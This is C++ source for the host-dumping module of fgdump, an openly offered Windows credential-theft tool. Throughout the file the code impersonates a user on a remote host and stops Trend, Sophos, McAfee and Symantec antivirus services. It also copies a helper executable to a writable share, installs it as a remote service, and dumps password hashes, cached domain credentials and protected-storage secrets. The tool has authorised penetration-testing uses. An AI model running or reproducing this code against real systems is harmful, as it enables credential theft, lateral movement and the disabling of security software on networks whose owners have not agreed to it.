/******************************************************************************
fgdump - by fizzgig and the foofus.net group
Copyright (C) 2008 by fizzgig
http://www.foofus.net

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
******************************************************************************/
#include "StdAfx.h"
#include "hostdumper.h"
#include "CacheDumpControl.h"
#include "ProtectedStorageControl.h"
#include "ServiceControl.h"
#include "Impersonator.h"
#include "AVStatus.h"
#include "RegQuery.h"
#include "ShareFinder.h"
#include ".\hostdumper.h"

#define CHARS_IN_GUID 39

HostDumper::HostDumper(char* lpszServerToDump, FGDump* pParent)
{
	if (pParent == NULL)
		throw(1);

	if (lpszServer == NULL)
		throw(1);

	fgdumpMain = pParent;
	memset(lpszServer, 0, MAX_PATH);
	strncpy(lpszServer, lpszServerToDump, MAX_PATH - 1);
	memset(lpszRemotePath, 0, MAX_PATH);
	nCacheID = Log.BeginCachedWrite();
}

HostDumper::~HostDumper(void)
{
	
}

bool HostDumper::FileExists(char* szFile)
{
	try
	{
		std::fstream fin;
		fin.open(szFile, std::ios::in);
		if(fin.is_open())
		{
			fin.close();
			return true;
		}

		fin.close();
		return false;
	}
	catch(...)
	{
		return false;
	}
}

int HostDumper::DumpServer(char* lpszUser, char* lpszPassword)
{
	McAfeeControl objMcAfeeService(nCacheID);
	SophosControl objSophosService(nCacheID);
	TrendControl objTrendService(nCacheID);
	SymantecAVControl objSAVService(nCacheID);
	NetUse objNetUse(nCacheID);
	PWDumpControl objPWDump(nCacheID);
	Impersonator impersonate(nCacheID);
	char szPath[MAX_PATH + 1];
	bool bSkipPwdump = false, bSkipCachedump = false, bSkipPStg = true;
	char* szWindowsVersion;
	GUID guidPipe;
	WCHAR wszGUID[CHARS_IN_GUID + 1];
	char szGUID[CHARS_IN_GUID + 1];
	char lpszPipeName[CHARS_IN_GUID + 1];
	bool bMCAVIsRunning = false, bSymantecAVIsRunning = false, bSophosAVIsRunning = false, bTrendAVIsRunning = false;
	bool bSkipPwdumpHistory = fgdumpMain->bSkipPwdumpHistory;
	bool bIs64BitTarget = false;
	bool bIsFgexecStillRunning = false;
	bRunLocal = fgdumpMain->bRunLocal;

	if (bRunLocal)
		Log.CachedReportError(nCacheID, CRITICAL, "\n** Beginning local dump **\n");
	else
        Log.CachedReportError(nCacheID, CRITICAL, "\n** Beginning dump on server %s **\n", lpszServer);
	
	lpszCacheDumpRemotePath = NULL;
	lpszUNCRemotePath = NULL;

	sControls.objTrendService = &objTrendService;
	sControls.objSophosService = &objSophosService;
	sControls.objMcAfeeService = &objMcAfeeService;
	sControls.objNetUse = &objNetUse;
	sControls.objPWDump = &objPWDump;
	sControls.objSAVService = &objSAVService;

	try
	{
		bSkipPwdump = (FileExists(szPath) && fgdumpMain->bSkipExisting) || !fgdumpMain->bRunPwdump;
		if (bSkipPwdump)
			Log.CachedReportError(nCacheID, INFO, "INFO: skipping pwdump on %s because %s exists or I was told to skip pwdumps\n", lpszServer, szPath);

		memset(szPath, 0, MAX_PATH + 1);
		_snprintf(szPath, MAX_PATH, "%s.cachedump", lpszServer);
		bSkipCachedump = (FileExists(szPath) && fgdumpMain->bSkipExisting) || !fgdumpMain->bRunCachedump;
		if (bSkipCachedump)
			Log.CachedReportError(nCacheID, INFO, "INFO: skipping cachedump on %s because %s exists or I was told to skip cache dumps\n", lpszServer, szPath);

		memset(szPath, 0, MAX_PATH + 1);
		_snprintf(szPath, MAX_PATH, "%s.lsadump", lpszServer);
		bSkipPStg = (FileExists(szPath) && fgdumpMain->bSkipExisting) || !fgdumpMain->bRunPStgDump;
		if (bSkipPStg)
			Log.CachedReportError(nCacheID, INFO, "INFO: skipping dump of protected storage secrets on %s because %s exists or I was told to skip LSA dumps\n", lpszServer, szPath);

		if (bSkipCachedump && bSkipPwdump && bSkipPStg)
		{
			Log.CachedReportError(nCacheID, CRITICAL, "Skipping: nothing to do\n");
			LogFailed.WriteFailedHost(lpszServer, FGDUMP_ERROR_BASE + 1, false, "Skipping: nothing to do");
			throw(1);
		}

		// Impersonate if a user was passed
		if (lpszUser != NULL)
		{
			// The impersonation object will automagically call RevertToSelf when it goes out of scope
			if (!impersonate.BeginImpersonation(lpszServer, lpszUser, lpszPassword))
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Impersonation failed");
				throw(1);
			}
		}
		else
			Log.CachedReportError(nCacheID, INFO, "Skipping impersonation (no user provided)\n");
		
		// Get the Windows version
		if (RegQuery::GetOSVersion(lpszServer, &szWindowsVersion, nCacheID, &bIs64BitTarget))
		{
			if (szWindowsVersion != NULL)
			{
				Log.CachedReportError(nCacheID, REGULAR_OUTPUT, "OS (%s): %s %s\n", lpszServer, szWindowsVersion, bIs64BitTarget ? "(64-bit)" : " ");
				free(szWindowsVersion);
			}
			else
			{
				Log.CachedReportError(nCacheID, CRITICAL, "Unable to determine OS version, see previous error for details\n");
			}
		}
		else
			Log.CachedReportError(nCacheID, CRITICAL, "Unable to determine OS version, see previous error for details\n");

		if (fgdumpMain->nOSBits == 32)
		{
			Log.CachedReportError(nCacheID, CRITICAL, "Overriding target architecture - using 32-bit (-O was used)\n");
			bIs64BitTarget = false;
		}
		else if (fgdumpMain->nOSBits == 64)
		{
			Log.CachedReportError(nCacheID, CRITICAL, "Overriding target architecture - using 64-bit (-O was used)\n");
			bIs64BitTarget = true;
		}

		// Is the remote service manager running? If not, pwdump and cachedump won't work
		if (!bRunLocal)
		{
			ServiceControl sc(nCacheID);
			SERVICE_STATUS status;
			FG_SERVICE_STATUS serviceStatus = sc.QueryServiceStatus(lpszServer, "RemoteRegistry", &status);
			if (serviceStatus == INSTALLED)
			{
				if (status.dwCurrentState != SERVICE_RUNNING)
				{
					Log.CachedReportError(nCacheID, CRITICAL, "CRITICAL: Error retrieving service information. Remote registry may not be running (for remote hosts), simple file sharing may be enabled, or the account may not have 'Log On as Batch Job' permission. Skipping this host.\n");
					LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Error retrieving service information. Remote registry may not be running (for remote hosts), simple file sharing may be enabled, or the account may not have 'Log On as Batch Job' permission.");
					throw(1);
				}
			}
			else
			{
				Log.CachedReportError(nCacheID, CRITICAL, "CRITICAL: Error retrieving service information. Remote registry may not be running (for remote hosts), simple file sharing may be enabled, or the account may not have 'Log On as Batch Job' permission. Skipping this host.\n");
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Error retrieving service information. Remote registry may not be running (for remote hosts), simple file sharing may be enabled, or the account may not have 'Log On as Batch Job' permission.");
				throw(1);
			}

			// Remote registry is installed, proceed
		}

		// Create GUIDs for fgexec
		CoCreateGuid(&guidPipe);
		memset(wszGUID, 0, CHARS_IN_GUID + 1);
		memset(szGUID, 0, CHARS_IN_GUID + 1);
		StringFromGUID2(guidPipe, wszGUID, CHARS_IN_GUID);
		wsprintf(lpszPipeName, "%ls", wszGUID);

		// Check if the .pwdump and .cachedump files for this server exist, and if so, skip them
		lpszCacheDumpRemotePath = new char[MAX_PATH];
		memset(lpszCacheDumpRemotePath, 0, MAX_PATH);
		lpszUNCRemotePath = new char[MAX_PATH];
		memset(lpszUNCRemotePath, 0, MAX_PATH);
		memset(szPath, 0, MAX_PATH + 1);
		_snprintf(szPath, MAX_PATH, "%s.pwdump", lpszServer);

		if (!fgdumpMain->bSkipAVCheck)
		{
			if (sControls.objTrendService->IsServiceInstalled(lpszServer))
			{
				switch(sControls.objTrendService->GetServiceState(lpszServer))
				{
				case AV_STOPPED:
					Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Trend is installed on this box, but not currently running. Leaving the service alone.\n");
					break;
				case AV_STARTED:
					if (fgdumpMain->bFullRun)
					{
						bTrendAVIsRunning = true;
						Log.CachedReportError(nCacheID, INFO, "Trend is running on this machine, shutting it down for a bit...\n");
						if (!sControls.objTrendService->StopService(lpszServer))
						{
							LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Trend AV was running but could not be stopped");
							throw(1);
						}
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Trend is running on this machine.\n");
					}
					break;
				case AV_UNKNOWN:
				default:
					if (fgdumpMain->bContinueOnUnknownAV)
					{
						Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Trend is installed on this box, but is in an unknown state. Not attempting to stop it, but continuing.\n");
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Trend is installed on this box, but is in an unknown state. Aborting the pwdump.\n");
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Trend AV was in an unknown state");
						throw(1);
					}
					break;
				}
			}

			if (sControls.objSophosService->IsServiceInstalled(lpszServer))
			{
				switch(sControls.objSophosService->GetServiceState(lpszServer))
				{
				case AV_STOPPED:
					Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Sophos is installed on this box, but not currently running. Leaving the service alone but proceeding with pwdump and cachedump\n");
					break;
				case AV_STARTED:
					if (fgdumpMain->bFullRun)
					{
						bSophosAVIsRunning = true;
						Log.CachedReportError(nCacheID, INFO, "Sophos is running on this machine, shutting it down for a bit...\n");
						if (!sControls.objSophosService->StopService(lpszServer))
						{
							LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Sophos AV was running but could not be stopped");
							throw(1);
						}
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Sophos is running on this machine.\n");
					}
					break;
				case AV_UNKNOWN:
				default:
					if (fgdumpMain->bContinueOnUnknownAV)
					{
						Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Sophos is installed on this box, but is in an unknown state. Not attempting to stop it, but continuing.\n");
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Sophos is installed on this box, but is in an unknown state. Aborting the pwdump.\n");
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Sophos AV was in an unknown state");
						throw(1);
					}
					break;
				}
			}

			if (sControls.objMcAfeeService->IsServiceInstalled(lpszServer))
			{
				switch(sControls.objMcAfeeService->GetServiceState(lpszServer))
				{
				case AV_STOPPED:
					Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "McAfee is installed on this box, but not currently running. Leaving the service alone but proceeding with pwdump and cachedump\n");
					break;
				case AV_STARTED:
					if (fgdumpMain->bFullRun)
					{
						bMCAVIsRunning = true;
						Log.CachedReportError(nCacheID, INFO, "McAfee is running on this machine, shutting it down for a bit...\n");
						if (!sControls.objMcAfeeService->StopService(lpszServer))
						{
							LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "McAfee AV was running but could not be stopped");
							throw(1);
						}
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "McAfee is running on this machine.\n");
					}
					break;
				case AV_UNKNOWN:
				default:
					if (fgdumpMain->bContinueOnUnknownAV)
					{
						Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "McAfee is installed on this box, but is in an unknown state. Not attempting to stop it, but continuing.\n");
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "McAfee is installed on this box, but is in an unknown state. Aborting the pwdump.\n");
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "McAfee AV was in an unknown state");
						throw(1);
					}
					break;
				}
			}

			if (sControls.objSAVService->IsServiceInstalled(lpszServer))
			{
				switch(sControls.objSAVService->GetServiceState(lpszServer))
				{
				case AV_STOPPED:
					Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Symantec is installed on this box, but not currently running. Leaving the service alone but proceeding with pwdump and cachedump\n");
					break;
				case AV_STARTED:
					if (fgdumpMain->bFullRun)
					{
						bSymantecAVIsRunning = true;
						Log.CachedReportError(nCacheID, INFO, "Symantec is running on this machine, shutting it down for a bit...\n");
						if (!sControls.objSAVService->StopService(lpszServer))
						{
							LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Symantec AV was running but could not be stopped");
							throw(1);
						}
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Symantec is running on this machine.\n");
					}
					break;
				case AV_UNKNOWN:
				default:
					if (fgdumpMain->bContinueOnUnknownAV)
					{
						Log.CachedReportError(nCacheID, fgdumpMain->bFullRun ? INFO : CRITICAL, "Symantec is installed on this box, but is in an unknown state. Not attempting to stop it, but continuing.\n");
					}
					else
					{
						Log.CachedReportError(nCacheID, CRITICAL, "Symantec is installed on this box, but is in an unknown state. Aborting the pwdump.\n");
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Symantec AV was in an unknown state");
						throw(1);
					}
					break;
				}
			}
		}

		if (!bRunLocal && fgdumpMain->bFullRun)
		{
			if (InstallAndStartFGExec(lpszPipeName, &bIsFgexecStillRunning) == false)
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), bIsFgexecStillRunning, "Unable to start the fgexec service");
				throw(1);	// Detailed errors should already have been printed if this fails
			}
		}
		else
		{
			strncpy(lpszUNCRemotePath, fgdumpMain->lpszTempPath, MAX_PATH);
			strncpy(lpszCacheDumpRemotePath, fgdumpMain->lpszTempPath, MAX_PATH);
		}

		//Log.ReportError(DEBUG, "PWDump path is %s\n", fgdumpMain->lpszPWDumpPath);

		if (fgdumpMain->bFullRun)
		{
			if (!bSkipPwdump)
			{
				if(sControls.objPWDump->Execute(fgdumpMain->lpszPWDumpPath, lpszServer, lpszUser, lpszPassword, bIs64BitTarget, bSkipPwdumpHistory) == false)
				{
					LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "PWDump failed - check error log");
				}
			}

			if (!bSkipCachedump)
			{
				if (bRunLocal)
				{
					if (RunCacheDump(fgdumpMain->lpszTempPath, bIs64BitTarget) == false) // Don't want a pipe for local stuff
					{
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Cachedump failed - check error log");
					}
				}
				else
				{
					if (RunCacheDump(fgdumpMain->lpszTempPath, bIs64BitTarget, lpszPipeName) == false)
					{
						LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Cachedump failed - check error log");
					}
				}
			}

			if (!bSkipPStg)
			{
				if (RunProtectedStorageDump(fgdumpMain->lpszTempPath, lpszUser, lpszPassword, lpszPipeName) == false)
				{
					LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Protected storage dump failed - check error log");
				}
		
			}
		}

		// Get rid of fgexec stuff
		if (!bRunLocal && fgdumpMain->bFullRun)
		{
			if (!StopAndRemoveFGExec(&bIsFgexecStillRunning))
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), bIsFgexecStillRunning, "Unable to stop fgexec service");
		}
	}
	catch(...)
	{
		if (lpszCacheDumpRemotePath != NULL)
			delete [] lpszCacheDumpRemotePath;

		if (lpszUNCRemotePath != NULL)
			delete [] lpszUNCRemotePath;
		
		return -1;
	}

	// Restart AV if it is running
	if (bTrendAVIsRunning)
	{
		if (sControls.objTrendService->IsServiceInstalled(lpszServer))
		{
			if (sControls.objTrendService->StartService(lpszServer) == false)
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to start AV services (Trend)");
			}
		}
	}
	if (bSophosAVIsRunning)
	{
		if (sControls.objSophosService->IsServiceInstalled(lpszServer))
		{
			if (sControls.objSophosService->StartService(lpszServer) == false)
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to start AV services (Sophos)");
			}
		}
	}
	if (bMCAVIsRunning)
	{
		if (sControls.objMcAfeeService->IsServiceInstalled(lpszServer))
		{
			if (sControls.objMcAfeeService->StartService(lpszServer) == false)
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to start AV services (McAfee)");
			}	
		}
	}
	if (bSymantecAVIsRunning)
	{
		if (sControls.objSAVService->IsServiceInstalled(lpszServer))
		{
			if (sControls.objSAVService->StartService(lpszServer) == false)
			{
				LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to start AV services (Symantec)");
			}
		}
	}

	if (lpszCacheDumpRemotePath != NULL)
		delete [] lpszCacheDumpRemotePath;

	if (lpszUNCRemotePath != NULL)
		delete [] lpszUNCRemotePath;
	
	return 1;
}

bool HostDumper::InstallAndStartFGExec(const char* lpszPipeName, bool* bIsStillRunning)
{
	ShareFinder objShares(nCacheID);
	ServiceControl objSC(nCacheID);
 
	//memset(szDriveTemp, 0, 3);
	//szDriveTemp[1] = ':';

	*bIsStillRunning = false;
	if (!bRunLocal)
	{
		objShares.EnumerateShares(lpszServer);

		if(objShares.GetAvailableWriteableShare(lpszServer, MAX_PATH, &lpszCacheDumpRemotePath, MAX_PATH, &lpszUNCRemotePath))
		{
			// Copy the files
			_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, "fgexec.exe");
			if (!CopyFile(fgdumpMain->lpszFGExecPath, lpszRemotePath, FALSE))
			{
				Log.CachedReportError(nCacheID, CRITICAL, "Unable to copy fgexec to target path!\n");
				//LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Unable to copy fgexec to target path");
				return false;
			}

			// Install the fgexec service
			_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s -s -n %s", lpszCacheDumpRemotePath, "fgexec.exe", lpszPipeName);
			Log.CachedReportError(nCacheID, DEBUG, "Execution path of fgexec is %s\n", lpszRemotePath);
			if(objSC.InstallService(lpszServer, "fgexec", "fgexec", lpszRemotePath))
			{
				if (objSC.StartService(lpszServer, "fgexec", 30))
				{
					Log.CachedReportError(nCacheID, DEBUG, "Successfully started fgexec service on %s\n", lpszServer);
				}
				else
				{
					Log.CachedReportError(nCacheID, CRITICAL, "Failed to start fgexec service on %s, uninstalling\n", lpszServer);
					if (!objSC.UninstallService(lpszServer, "fgexec"))
					{
						Log.CachedReportError(nCacheID, CRITICAL, "WARNING: Unable to uninstall the fgexec service, you may have to do it by hand!\n");
						*bIsStillRunning = true;
						//LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to uninstall the fgexec service (fgexec not started)");
					}

					//objShares.UnbindDrive(szDriveTemp);
					return false;
				}
			}
			else
			{
				Log.CachedReportError(nCacheID, CRITICAL, "Failed to install fgexec service on %s\n", lpszServer);
				//LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Unable to install the fgexec service");
				//objShares.UnbindDrive(szDriveTemp);
				return false;
			}
		}
		else
		{
			Log.CachedReportError(nCacheID, CRITICAL, "Unable to establish a writable connection to %s, cachedump will not be performed\n", lpszServer);
			//LogFailed.WriteFailedHost(lpszServer, GetLastError(), false, "Unable to establish a writable connection, cachedump will not be performed\n");
			return false;
		}
	}

	return true;
}

bool HostDumper::StopAndRemoveFGExec(bool* bIsStillRunning)
{
	ServiceControl objSC(nCacheID);

	*bIsStillRunning = false;

	if (objSC.StopService(lpszServer, "fgexec", 30))
	{
		Log.CachedReportError(nCacheID, DEBUG, "Successfully stopped fgexec service on %s\n", lpszServer);
		if (!objSC.UninstallService(lpszServer, "fgexec"))
		{
			*bIsStillRunning = false;
			Log.CachedReportError(nCacheID, CRITICAL, "WARNING: Unable to uninstall the fgexec service, you may have to do it by hand!\n");
			//LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to uninstall the fgexec service (fgexec successfully stopped)\n");
		}
	}
	else
	{
		*bIsStillRunning = false;
		Log.CachedReportError(nCacheID, CRITICAL, "WARNING: failed to stop fgexec service on %s! You may need to stop it and uninstall it by hand!!\n", lpszServer);
		//LogFailed.WriteFailedHost(lpszServer, GetLastError(), true, "Unable to stop the fgexec service, the service may still be installed\n");
	}

	_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, "cachedump.exe");
	DeleteFile(lpszRemotePath);
	_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, "cachedump64.exe");
	DeleteFile(lpszRemotePath);
	_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, "fgexec.exe");
	DeleteFile(lpszRemotePath);

	return true;
}

bool HostDumper::RunCacheDump(char* lpszTempPath, bool bIs64Bit, char* lpszPipeName)
{
	CacheDumpControl objCacheDump(nCacheID);

	_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, bIs64Bit ? "cachedump64.exe" : "cachedump.exe");
	CopyFile(fgdumpMain->lpszCacheDumpPath, lpszRemotePath, FALSE);

	if (!objCacheDump.Execute(fgdumpMain->lpszFGExecPath, lpszCacheDumpRemotePath, lpszServer, bIs64Bit, lpszPipeName))
	{
		Log.CachedReportError(nCacheID, CRITICAL, "Failed to dump cache\n");
		return false;
	}

	return true;
}

bool HostDumper::RunProtectedStorageDump(char* lpszTempPath, char* lpszUser, char* lpszPassword, char* lpszPipeName)
{
	ProtectedStorageControl objPStgDump(nCacheID);

	_snprintf(lpszRemotePath, MAX_PATH, "%s\\%s", lpszUNCRemotePath, "pstgdump.exe");
	CopyFile(fgdumpMain->lpszPStoragePath, lpszRemotePath, FALSE);

	if (!objPStgDump.Execute(fgdumpMain->lpszFGExecPath, lpszCacheDumpRemotePath, lpszServer, lpszUser, lpszPassword, lpszPipeName))
	{
		Log.CachedReportError(nCacheID, CRITICAL, "Failed to dump protected storage\n");
		return false;
	}

	return true;
}
void HostDumper::FlushOutput(void)
{
	Log.FlushCachedWrite(nCacheID);
}
